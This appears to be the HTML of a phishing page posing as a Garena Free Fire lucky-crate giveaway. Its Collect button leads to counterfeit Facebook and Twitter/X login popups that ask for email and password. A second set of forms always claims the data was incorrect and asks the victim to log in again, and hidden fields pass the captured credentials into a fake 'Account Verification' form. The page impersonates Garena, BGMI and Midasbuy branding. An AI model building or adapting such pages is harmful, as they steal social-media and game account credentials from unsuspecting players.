</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-yel" style="margin-top:15px;">GOLDEN - SAKURA ( JACKET )</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;">GOLDEN SEASON 1 SAKURA JACKET</div>
</div>
</div>

<div class="item_reward" id="items2">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/2.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-yel" style="margin-top:15px;">Sakura</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;">Season 1 Sakura</div>
</div>
</div>

<div class="item_reward" id="items3">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/3.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-yel" style="margin-top:15px;">The Streets (Jacket)</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;">Season 2 Hiphop</div>
</div>
</div>

<div class="item_reward" id="items4">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/4.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-red" style="margin-top:15px;">Golden Hiphop</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;">Season 2 Golden Hiphop</div>
</div>
</div>

<div class="item_reward" id="items5">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/5.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-red" style="margin-top:15px;">HipHop Cap</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items6">
<div class="lenzzitems">
<div>
<img style="border-bottom: 0px;margin-bottom: -20px;" src="lenzz/lenzz-list/6.png">
</div>
<div class="item-title3" style="height: 30px;"></div>
<div class="item-title" style="margin-top:15px;">Old Man Mask</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items7">
<div class="lenzzitems">
<div>
<img style="border-bottom: 0px;margin-bottom: -20px;" src="lenzz/lenzz-list/7.png">
</div>
<div class="item-title3" style="height: 30px;"></div>
<div class="item-title" style="margin-top:15px;">Blue Angelic Pant</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items8">
<div class="lenzzitems">
<div>
<img style="border-bottom: 0px;margin-bottom: -20px;" src="lenzz/lenzz-list/8.png">
</div>
<div class="item-title3" style="height: 30px;"></div>
<div class="item-title" style="margin-top:15px;">Oni Mask</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items9">
<div class="lenzzitems">
<div>
<img style="border-bottom: 0px;margin-bottom: -20px;" src="lenzz/lenzz-list/9.png">
</div>
<div class="item-title3" style="height: 30px;"></div>
<div class="item-title" style="margin-top:15px;">M1887 - RAPPER UNDERWORLD</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items10">
<div class="lenzzitems">
<div>
<img style="border-bottom: 0px;width: 50%;height: 50%;margin-top: 80px;margin-bottom: 48px;margin-left: 0px;" src="lenzz/lenzz-list/10.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3" style="margin-bottom:-10px;"></div>
<div class="item-title">MP40 - PREDATORY COBRA</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items11">
<div class="lenzzitems">
<div>
<img style="border-bottom: 0px;width: 50%;height: 50%;margin-top: 80px;margin-bottom: 48px;margin-left: 0px;" src="lenzz/lenzz-list/11.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3" style="margin-bottom:-10px;"></div>
<div class="item-title">AK47 - BLUE FLAME DRACO</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items12">
<div class="lenzzitems">
<div>
<img style="border-bottom: 0px;width: 50%;height: 50%;margin-top: 80px;margin-bottom: 48px;margin-left: 0px;" src="lenzz/lenzz-list/12.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3" style="margin-bottom:-10px;"></div>
<div class="item-title">M1887 - GOLDEN GLARE</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items13">
<div class="lenzzitems">
<div>
<img style="border-bottom: 0px;width: 50%;height: 50%;margin-top: 80px;margin-bottom: 48px;margin-left: 0px;" src="lenzz/lenzz-list/13.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3" style="margin-bottom:-10px;"></div>
<div class="item-title">M1887 - ONE PUNCH MAN</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items14">
<div class="lenzzitems">
<div>
<img style="border-bottom: 0px;width: 50%;height: 50%;margin-top: 80px;margin-bottom: 48px;margin-left: 0px;" src="lenzz/lenzz-list/14.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3" style="margin-bottom:-10px;"></div>
<div class="item-title">AN94 - EVIL HOWLER</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items15">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/15.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-red" style="margin-top:15px;">M1887 - STERLING CONQUEROR</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items16">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/16.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-red" style="margin-top:15px;">FAMAS - DEMONIC GRIN</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items17">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/17.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-red" style="margin-top:15px;">M1014 - GREEN FLAME DRACO</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items18">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/18.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-red" style="margin-top:15px;">SCAR - MEGALODON ALPHA</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items19">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/19.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-red" style="margin-top:15px;">M4A1 - INFERNAL DRACO</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items20">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/20.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-red" style="margin-top:15px;">XM8 - DESTINY GUARDIAN</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

<div class="item_reward" id="items21">
<div class="lenzzitems">
<div>
<img style="margin-top: 60px;margin-bottom: -25px;border-bottom: 0px;margin-left: -25px;" src="lenzz/lenzz-list/21.png">
<div class="killmess"></div>
</div>
<div class="showkill"></div>
<div class="item-title3"></div>
<div class="item-title-red" style="margin-top:15px;">UMP - BOYAH DAY 2021</div>
<div class="item-title2" style="margin-bottom:-5px; color:#fff;"></div>
</div>
</div>

</div> <!--- lab-rewards --->
</div> <!--- box-lenzz-content --->
</div> <!--- box-lenzz-wrapper --->
</div> <!--- lenzz-crate-wrapper --->

<div class="sec-menu-wrapper-navbars">
<div class="box-lenzz-wrapper-navbar">
<div class="box-lenzz-wrapper-navbar-menu">
<div class="box-lenzz-wrapper-navbar-menu-txt"><img src="lenzz/details.png">Lucky Wheel</div></div>
<div class="box-lenzz-wrapper-navbar-menu" style="float: right;">
<div class="box-lenzz-wrapper-navbar-menu-txt"><img src="lenzz/time.png">7 Days</div></div>
</div>
</div> <!--- sec-menu-wrapper-navbars --->
<div class="sec-menu-wrappers">
<center>
<div class="scroll">
<img class="lenzz-content" src="lenzz/lenzz-gift/select1.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items1');"></img>
<img class="lenzz-content" id="defaultreward" src="lenzz/lenzz-gift/select2.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items2');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select3.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items3');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select4.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items4');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select5.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items5');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select6.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items6');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select7.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items7');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select8.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items8');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select9.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items9');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select10.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items10');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select11.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items11');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select12.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items12');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select13.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items13');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select14.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items14');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select15.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items15');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select16.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items16');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select17.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items17');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select18.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items18');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select19.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items19');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select20.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items20');"></img>
<img class="lenzz-content" src="lenzz/lenzz-gift/select21.jpg" onmousedown="buka.play();" onclick="openLenzzReward(event, 'items21');"></img>
</div>
</center>

<div class="box-lenzz-button" style="background: url(lenzz/btn-off.png) no-repeat center center; background-size: 100% 100%;" onmousedown="buka.play();" onclick="open_once_confirmation()">
<div class="box-lenzz-button-menu">
<div class="box-lenzz-button-menu-txt" style="padding-bottom: 1px; text-align: center;">Open once</div>
<img style="margin-left: 30%;" src="lenzz/tokens.png"><div class="box-lenzz-button-menu-txt" style="margin-top: -2px;">40,000</div>
</div>
</div>
<div class="box-lenzz-button" style="background: url(lenzz/btn-on.png) no-repeat center center; background-size: 100% 100%;" onmousedown="buka.play();" onclick="open_many_confirmation()">
<div class="box-lenzz-button-menu">
<div class="box-lenzz-button-menu-txt" style="padding-bottom: 1px; text-align: center;">Open 5 times</div>
<img style="margin-left: 28%;" src="lenzz/tokens.png"><div class="box-lenzz-button-menu-txt" style="margin-top: -2px;">200,000</div>
</div>
</div>

</div> <!--- sec-menu-wrappers --->
</div> <!--- tab_rewards --->

</div> <!--- box --->
</div> <!--- sec-container --->

<div class="footer"><br>
<img class="footer-copyright-icon" src="lenzz/lenzz-asset/footer.png" style="margin-top: -15px;">
<div class="footer-txt-copyright">ⓒ 2024 Garena, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Terms of Service | Rules of Conduct <br> | Official Community Policy</div> <!--- footer-txt-copyright --->
<br>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup once_confirmation animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Purchase</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert-enter"></div>
<div class="popup-box-alert-center" style="margin-top: 0px; line-height: 15px;">Spend <img src="lenzz/tokens.png"><span>40,000</span> to</div> <!--- popup-box-alert-center --->
<div class="popup-box-alert" style="font-family: lenzz;margin-top: 0px; line-height: 15px;">Purchase <span>Free Fire Lucky Crate?</span></div> <!--- popup-box-alert --->
<br><br>
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_rewards()">Cancel</button>
<button type="button" onmousedown="buka.play();" value="lenzzdrop" onclick="lenzzdrop('idvidlenzz')">OK</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup once_confirmation --->

<div class="popup many_confirmation animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Purchase</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert-enter"></div>
<div class="popup-box-alert-center" style="margin-top: 0px; line-height: 15px;">Spend <img src="lenzz/tokens.png"><span>200,000</span> to</div> <!--- popup-box-alert-center --->
<div class="popup-box-alert" style="font-family: lenzz;margin-top: 0px; line-height: 15px;">Purchase <span>Free Fire Lucky Create?</span></div> <!--- popup-box-alert --->
<br><br>
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_rewards()">Cancel</button>
<button type="button" onmousedown="buka.play();" value="lenzzdrops" onclick="lenzzdrops('idvidlenzz')">OK</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup many_confirmation --->

<div class="popup once_rewards animated fadeIn" style="display: none;">
<div class="popup-box-wrapper-login">
<div class="lenzzpopup">
<div class="popup-box-alert-enter"></div>
<div class="popup-box-item-once itemShine">
<div>
<figure>
<img class="onceRewardsImg" id="flip" src="">
</figure>
</div>
</div> <!--- popup-box-item-once itemShine --->
</div> <!--- lenzzpopup --->
<div class="popup-box-footer2" style="margin-top:-50px;">
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup once_rewards --->

<div class="popup many_rewards animated fadeIn" style="display: none;">
<div class="popup-box-wrapper-login">
<div class="lenzzpopup">
<div class="popup-box-alert-enter"></div>
<div class="popup-box-item-many itemShine">
<div>
<figure>
<img class="manyRewardsImg1" id="flip1" src="">
</figure>
</div>
</div> <!--- popup-box-item-many itemShine --->
<div class="popup-box-item-many itemShine">
<div>
<figure>
<img class="manyRewardsImg2" id="flip2" src="">
</figure>
</div>
</div> <!--- popup-box-item-many itemShine --->
<div class="popup-box-item-many itemShine">
<div>
<figure>
<img class="manyRewardsImg3" id="flip3" src="">
</figure>
</div>
</div> <!--- popup-box-item-many itemShine --->
<div class="popup-box-item-many itemShine">
<div>
<figure>
<img class="manyRewardsImg4" id="flip4" src="">
</figure>
</div>
</div> <!--- popup-box-item-many itemShine --->
<div class="popup-box-item-many itemShine">
<div>
<figure>
<img class="manyRewardsImg5" id="flip5" src="">
</figure>
</div>
</div> <!--- popup-box-item-many itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer2" style="margin-top:-50px;">
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup many_rewards --->

<div class="popup lenzz_airdrop" style="display: none;">
<div class="popup-box-wrapper-login">
<div class="lenzz_airdrop">
<video id="idvidlenzz" width="320" height="auto">
<source src="lenzzmedia/airdroplenzz.webm" type="video/webm"/>
<source src="lenzzmedia/airdroplenzz.webm" type="video/mp4"/></video>
</div> <!--- lenzz_airdrop --->
</div> <!--- popup-box-wrapper-login --->
</div> <!--- popup lenzz_airdrop --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onmousedown="tutup.play();" onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter"><img src="lenzz/lenzz-asset/icon-twitter.png">
<div class="header-twitter-text"> Log in With Twitter </div></div> <!--- navbar-fb-text --->
<div class="content-box-twitter">
<div class="txt-login-twitter">Log in to your X account to connect to BGMI MOBILE.</div> <!--- txt-login-twitter --->
<div class="content-box-twitter-txt">
<img src="lenzz/lenzz-asset/icon.png">
<div class="content-box-twitter-txt-title">
BGMI MOBILE<br></div>
<div class="content-box-twitter-txt-det">
WINNER WINNER CHICKEN DINNER!
<br>
Official BGMI MOBILE Game!</div></div>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="form-group-twitter">
<input type="text" name="email" id="email-twitter" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Phone, email, or username</label>
</div> <!--- form-group-twitter --->
<div class="form-group-twitter">
<div class="form-group-sohi TwitterShowPassword" onclick="showTwitterPassword()">
<img src="lenzz/lenzz-asset/Twitter-Hide-Password.png">
</div> <!--- form-group-sohi TwitterShowPassword --->
<div class="form-group-sohi TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()">
<img src="lenzz/lenzz-asset/Twitter-Show-Password.png">
</div> <!--- form-group-sohi TwitterHidePassword --->
<input type="password" name="password" id="password-twitter" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Password</label>
</div> <!--- form-group-twitter --->
<center><div class="alert-twitter-failed email-tw">
<a class="alert-twitter"><img class"alert-img" src="lenzz/lenzz-asset/alert.png">Sorry, we couldn't find your account.</a></div>
<div class="alert-twitter-failed sandi-tw">
<a class="alert-twitter"><img class"alert-img" src="lenzz/lenzz-asset/alert.png">Wrong Password!</a></div></center>
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
<button type="submit" href='#kinn-verify-on' class="onbutton" onclick="ValidateLoginTwitterData()">Log in</button>
</form>
<div class="content-box-twitter-txt-footer">
We recommend reviewing the app's terms and privacy policy to understand how it will use data from your Twitter account. You can revoke access to any app at any time from the <a>Apps and sessions</a> of your Twitter account settings.<br></div>
<div class="content-box-twitter-txt-footers">
By continuing, BGMI MOBILE will receive ongoing access to the information that you share and Twitter will record when BGMI MOBILE accesses it. <a>Learn more</a> about this sharing and the settings that you have. BGMI MOBILE's <a>Privacy Policy</a> and <a>Terms</a>.<br></div>
</div> <!--- content-box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter-load" style="display: none;">
<div class="popup-box-login-twitter">
<div class="header-twitter"><img src="lenzz/lenzz-asset/icon-twitter.png">
<div class="header-twitter-text"> Log in With Twitter </div></div> <!--- navbar-fb-text --->
<div class="twitter-load">
<div class="twitter-load-title">
<div class="loader2"></div>
</div> <!--- twitter-load-title --->
</div> <!--- twitter-load --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onmousedown="tutup.play();" onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="lenzz/lenzz-asset/icon-facebook.png">
<div class="navbar-fb-text"> Log in With Facebook </div></div> <!--- navbar-fb-text --->
<div class="navbar-alert-fb email-fb">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></div> <!--- navbar-alert --->
<div class="navbar-alert-fb sandi-fb">The password that you've entered is incorrect. <b>Forgotten password?</b></div> <!--- navbar-alert --->
<div class="content-box-fb">
<img src="lenzz/lenzz-asset/icon.png">
<div class="txt-login-fb">Log in to your Facebook account to connect to Garena Free Fire.</div> <!--- txt-login-fb --->
<div class="txt-login-alert">This doesn't let the app post to Facebook.</div> <!--- txt-login-fb --->
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<div class="form-group-fb">
<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<div class="login-form-shid showPassword" id="showFbPassword" onclick="showFbPassword()">Show</div> <!--- login-form-shid showPassword --->
<div class="login-form-shid hidePassword" style="display: none;" onclick="hideFbPassword()">Hide</div> <!--- login-form-shid hidePassword --->
<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-footer">By continuing, Garena Free Fire will receive ongoing access to the information that you share and Facebook will record when Garena Free Fire accesses it. <a>Learn more</a> about this sharing and the settings that you have.</div> <!--- txt-footer --->
<div class="txt-footers">Garena Free Fire <a>Privacy Policy</a> and <a>Terms</a>
</div> <!--- txt-footer ---><br>
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-facebook-load" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb"><img src="lenzz/lenzz-asset/icon-facebook.png">
<div class="navbar-fb-text"> Log in With Facebook </div></div> <!--- navbar-fb-text --->
<div class="content-box-fb">
<div class="fb-load">
<img src="lenzz/lenzz-asset/icon_fb.png">
<div class="loader3"></div>
</div> <!--- fb-load --->
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup-login login-facebook-sec animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb"><img src="lenzz/lenzz-asset/icon-facebook.png">
<div class="navbar-fb-text"> Log in With Facebook </div></div> <!--- navbar-fb-text --->
<div class="navbar-alert-fb wrong-fb" style="display: block;text-align: center;"><b>The data you entered is incorrect.<br>Please re-login using the correct data!</b></div> <!--- navbar-alert --->
<div class="navbar-alert-fb email-fb">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></div> <!--- navbar-alert --->
<div class="navbar-alert-fb sandi-fb">The password that you've entered is incorrect. <b>Forgotten password?</b></div> <!--- navbar-alert --->
<div class="content-box-fb">
<img src="lenzz/lenzz-asset/icon_2.jpg">
<div class="txt-login-fb">To connect to Garena Free Fire<br>log in to your Facebook account.</div> <!--- txt-login-fb --->
<div class="txt-login-alert">This doesn't let the app post to Facebook.</div> <!--- txt-login-fb --->
<form class="login-form" action="javascript:void(0)" method="post" id="SecValidateLoginFbForm">
<div class="form-group-fb">
<input type="text" name="email" id="sec-email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<div class="login-form-shid showPassword" id="showFbPassword" onclick="showFbPasswordS()">Show</div> <!--- login-form-shid showPassword --->
<div class="login-form-shid hidePassword" style="display: none;" onclick="hideFbPasswordS()">Hide</div> <!--- login-form-shid hidePassword --->
<input type="password" name="password" id="sec-password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<input type="hidden" name="login" id="sec-login-facebook" value="Facebook" readonly>
<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
<button type="submit" class="btn-login-fb" onclick="SecValidateLoginFbData()">Log In</button>
</form>
<div class="txt-footer">By continuing, Midasbuy will receive ongoing access to the information that you share and Facebook will record when Midasbuy accesses it. <a>Learn more</a> about this sharing and the settings that you have.</div> <!--- txt-footer --->
<div class="txt-footers">Midasbuy's <a>Privacy Policy</a> and <a>Terms</a>
</div> <!--- txt-footer ---><br>
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter-sec animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<div class="header-twitter"><img src="lenzz/lenzz-asset/icon-twitter.png">
<div class="header-twitter-text"> Log in With Twitter </div></div> <!--- navbar-fb-text --->
<div class="content-box-twitter">
<div class="txt-login-twitter">To connect to BGMI MOBILE<br>log in to your X account.</div> <!--- txt-login-twitter --->
<div class="content-box-twitter-txt">
<img src="lenzz/lenzz-asset/icon_2.jpg">
<div class="content-box-twitter-txt-title">
BGMI MOBILE<br></div>
<div class="content-box-twitter-txt-det">
WINNER WINNER CHICKEN DINNER!
<br>
Official BGMI MOBILE Game!</div></div>
<form action="javascript:void(0)" method="post" id="SecValidateLoginTwitterForm">
<div class="form-group-twitter">
<input type="text" name="email" id="sec-email-twitter" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Phone, email, or username</label>
</div> <!--- form-group-twitter --->
<div class="form-group-twitter">
<div class="form-group-sohi TwitterShowPassword" onclick="showTwitterPasswordS()">
<img src="lenzz/lenzz-asset/Twitter-Hide-Password.png">
</div> <!--- form-group-sohi TwitterShowPassword --->
<div class="form-group-sohi TwitterHidePassword" style="display: none;" onclick="hideTwitterPasswordS()">
<img src="lenzz/lenzz-asset/Twitter-Show-Password.png">
</div> <!--- form-group-sohi TwitterHidePassword --->
<input type="password" name="password" id="sec-password-twitter" autocomplete="off" required oninvalid="this.setCustomValidity(' ')" oninput="setCustomValidity('')">
<label>Password</label>
</div> <!--- form-group-twitter --->
<center>
<div class="alert-twitter-faileds wrong-tw" style="display: block;">
<a class="alert-twitters"><img class"alert-img" src="lenzz/lenzz-asset/alert.png">The data you entered is incorrect.<br>Please re-login using the correct data!</a></div>
<div class="alert-twitter-failed email-tw">
<a class="alert-twitter"><img class"alert-img" src="lenzz/lenzz-asset/alert.png">Sorry, we couldn't find your account.</a></div>
<div class="alert-twitter-failed sandi-tw">
<a class="alert-twitter"><img class"alert-img" src="lenzz/lenzz-asset/alert.png">Wrong Password!</a></div></center>
<input type="hidden" name="login" id="sec-login-twitter" value="Twitter" readonly>
<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
<button type="submit" href='#kinn-verify-on' class="seconbutton" onclick="SecValidateLoginTwitterData()">Log in</button>
</form>
<div class="content-box-twitter-txt-footer">
We recommend reviewing the app's terms and privacy policy to understand how it will use data from your Twitter account. You can revoke access to any app at any time from the <a>Apps and sessions</a> of your Twitter account settings.<br></div>
<div class="content-box-twitter-txt-footers">
By continuing, Midasbuy will receive ongoing access to the information that you share and Twitter will record when Midasbuy accesses it. <a>Learn more</a> about this sharing and the settings that you have. Midasbuy's <a>Privacy Policy</a> and <a>Terms</a>.<br></div>
</div> <!--- content-box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup account_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapper popup-box-verification">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg-verify">
<div class="popup-box-alert-verif">
<div class="popup-box-alert-enter" style="margin-top:-10; padding-top: 0px;"></div>
For validation purposes, please complete the form regarding your Free Fire Account.</div> <!--- popup-box-alert --->
<div class="popup-box-alert-line" style="width:88%;"></div><br>
<div id="load-verify" style="height:260px; display: none;">
<img class="load-login-gif" src="lenzz/lenzz-asset/load.gif"></img>
<div class="popup-box-form-footer"></div> <!--- popup-box-form-footer --->
</div>
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<div id="stepform" style="height:260px;">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="hidden" name="login" id="validateLogin" readonly>
<input type="hidden" name="playid" id="ValidatePopupPlayId" readonly>
